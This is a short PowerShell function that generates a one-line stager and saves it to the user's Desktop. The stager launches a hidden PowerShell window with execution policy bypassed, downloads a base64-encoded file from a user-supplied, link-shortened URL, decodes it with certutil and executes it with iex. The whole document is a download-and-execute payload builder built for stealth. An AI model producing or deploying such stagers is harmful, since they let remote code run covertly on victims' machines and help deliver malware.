function Base64-irm {
    $url = Read-Host "Enter the URL (use https://t.ly/)"

    $scriptContent = @"
powershell -NoP -W H -Ep Bypass irm $url -O $env:USERPROFILE\e.txt;certutil -f -decode $env:USERPROFILE\e.txt $env:USERPROFILE\d.ps1;iex $env:USERPROFILE\d.ps1
"@

    $scriptPath = "$env:USERPROFILE\Desktop\Base64-irm.txt"
    Set-Content -Path $scriptPath -Value $scriptContent

    Write-Host "Script saved as $scriptPath"
}
